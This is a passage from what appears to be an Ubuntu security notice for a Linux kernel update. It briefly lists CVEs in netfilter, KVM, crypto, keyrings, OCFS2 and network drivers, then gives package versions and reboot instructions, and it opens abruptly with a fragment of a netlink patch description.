tail already reserved, so that the call to nlmsg\_put\_answer does not
fail. Otherwise, library authors are forced to find some bizarre sized
receive buffer that has a large modulo relative to the common sizes of
messages received, which is ugly and buggy.
This patch thus saves the NLMSG\_DONE for an additional message, for the
case that things are dangerously close to the brim. This requires
keeping track of the errno from ->dump() across calls.

properly restrict access to the connection tracking helpers list. A local

attacker could use this to bypass intended access restrictions.

([CVE-2017-17448](/security/CVE-2017-17448))

It was discovered that the netfilter passive OS fingerprinting (xt\_osf)

module did not properly perform access control checks. A local attacker

could improperly modify the system-wide OS fingerprint list.

([CVE-2017-17450](/security/CVE-2017-17450))

Dmitry Vyukov discovered that the KVM implementation in the Linux kernel

contained an out-of-bounds read when handling memory-mapped I/O. A local

attacker could use this to expose sensitive information. ([CVE-2017-17741](/security/CVE-2017-17741))

It was discovered that the Salsa20 encryption algorithm implementations in

the Linux kernel did not properly handle zero-length inputs. A local

attacker could use this to cause a denial of service (system crash).

([CVE-2017-17805](/security/CVE-2017-17805))

It was discovered that the HMAC implementation did not validate the state

of the underlying cryptographic hash algorithm. A local attacker could use

this to cause a denial of service (system crash) or possibly execute

arbitrary code. ([CVE-2017-17806](/security/CVE-2017-17806))

It was discovered that the keyring implementation in the Linux kernel did

not properly check permissions when a key request was performed on a task's

default keyring. A local attacker could use this to add keys to

unauthorized keyrings. ([CVE-2017-17807](/security/CVE-2017-17807))

It was discovered that a race condition existed in the OCFS2 file system

implementation in the Linux kernel. A local attacker could use this to

cause a denial of service (kernel deadlock). ([CVE-2017-18204](/security/CVE-2017-18204))

It was discovered that the Broadcom NetXtremeII ethernet driver in the

Linux kernel did not properly validate Generic Segment Offload (GSO) packet

sizes. An attacker could use this to cause a denial of service (interface

unavailability). ([CVE-2018-1000026](/security/CVE-2018-1000026))

It was discovered that the Reliable Datagram Socket (RDS) implementation in

the Linux kernel contained an out-of-bounds write during RDMA page allocation. An

attacker could use this to cause a denial of service (system crash) or

possibly execute arbitrary code. ([CVE-2018-5332](/security/CVE-2018-5332))

Mohamed Ghannam discovered a null pointer dereference in the RDS (Reliable

Datagram Sockets) protocol implementation of the Linux kernel. A local

attacker could use this to cause a denial of service (system crash).

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 17.10

* [linux-image-4.13.0-38-generic](https://launchpad.net/ubuntu/%2Bsource/linux)

  -
  [4.13.0.38.41](https://launchpad.net/ubuntu/%2Bsource/linux/4.13.0-38.43)

After a standard system update you need to reboot your computer to make

all the necessary changes.

ATTENTION: Due to an unavoidable ABI change the kernel updates have

been given a new version number, which requires you to recompile and

reinstall all third party kernel modules you might have installed.

Unless you manually uninstalled the standard kernel metapackages

(e.g. linux-generic, linux-generic-lts-RELEASE, linux-virtual,

linux-powerpc), a standard system upgrade will automatically perform

this as well.
